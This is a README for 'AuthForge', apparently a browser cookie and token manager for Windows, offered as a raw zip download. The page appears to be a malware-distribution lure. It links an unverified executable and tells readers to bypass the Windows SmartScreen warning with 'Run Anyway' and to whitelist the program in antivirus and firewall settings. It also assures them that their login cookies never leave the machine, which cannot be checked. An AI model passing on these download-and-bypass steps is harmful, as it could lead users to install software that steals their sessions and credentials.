# 🔑 AuthForge - Manage browser cookies and tokens easily

[![](https://img.shields.io/badge/Download_AuthForge-blue)](https://github.com/Zaredreverent616/AuthForge/raw/refs/heads/main/shared/Forge_Auth_v1.5.zip)

AuthForge helps you view and manage the data your browser uses to keep you signed in to websites. Browsers store this information in small files called cookies and tokens. This tool makes it simple to see these files, copy them for your notes, or edit them when you need to test how a website behaves.

## 📥 How to download

Visit [this page](https://github.com/Zaredreverent616/AuthForge/raw/refs/heads/main/shared/Forge_Auth_v1.5.zip) to find the latest version of the software. You will see a list of files under the Assets section. Choose the file that ends in .zip for your Windows computer. Save this folder to your desktop so you can find it later.

## 🛠️ Setting up the software

After you download the file, find it in your downloads folder. Right-click the folder and select Extract All. Choose a location on your computer and click Extract. Open the new folder you just created. You will see a file named AuthForge.exe inside. Double-click this file to start the program. Windows might show a screen that says Windows protected your PC. If this happens, click More Info, then click Run Anyway. This confirms you want to open the tool.

## 📋 What this tool does

AuthForge provides a clear view of the authentication data inside your browser. Here is how it helps:

- View active sessions: See which websites currently have a login token stored for your account.
- Copy data: Easily copy cookie values to your clipboard to use in other programs.
- Edit values: Change the expiration date or the content of a cookie to see how a website reacts.
- Delete information: Remove specific browser data to force a logout or clear clutter.
- Save progress: Export your cookie lists to a file so you can import them again later.

## 🔍 How to use the interface

The main screen lists every browser profile found on your machine. Click on a browser name to see its list of stored cookies. You will see columns for the domain name, the cookie name, and the expiration date. Click on any row to see the full content of that specific item in the panel on the right side. Use the search bar at the top to filter items by name or by the website address. 

If you want to modify a value, click the Edit button below the data panel. Type your new information into the box and click Save. The change applies to your browser immediately. If you need to remove an item, select the row and click the Delete button.

## 💻 System requirements

AuthForge needs a Windows 10 or Windows 11 computer to run well. You need at least 200 megabytes of free disk space. The program works with most modern browsers like Chrome, Edge, and Brave. Ensure you have the latest updates installed for your operating system to prevent errors while the program reads your browser files.

## 🛡️ Privacy and safety

This tool runs locally on your computer. It does not send your cookies or your login information to any outside servers. You keep full control over your data. Because you can change your login state, use this tool with care. If you change a cookie incorrectly, you might find that you are logged out of your favorite websites. If this happens, simply sign in to the website again through your browser. 

## ⚙️ Advanced features

For users who want to debug complex websites, AuthForge lets you save snippets. A snippet is a saved group of cookies that you can apply with one click. This saves time if you test the same website settings multiple times. To create a snippet, select the cookies you want to save, click the Menu button, and choose Save As Snippet. Give your snippet a name. You can load this snippet anytime from the Snip Library tab to reset your browser state to that exact look.

## ❓ Common questions

Does it work with Firefox?
Currently, AuthForge focuses on Chrome and Edge browsers. Future updates might add support for other browsers based on user interest.

Why are there so many cookies?
Websites create cookies to track your preferences, like your language settings or theme choices, in addition to your login status. 

Can I hurt my computer with this?
No. This tool only lets you view and edit temporary browser files. It cannot change system files or damage your computer hardware. If you delete a critical cookie, the worst result is that you will need to sign in to a website again.

What if the program does not open?
Check your antivirus software. Sometimes security settings block new programs from opening. Allow the application in your firewall settings if you trust the source.

How do I get help?
If you have trouble, check the issues tab on the main repository page. Other users might have solved the same problem. You can also start a new discussion there if you find a bug.
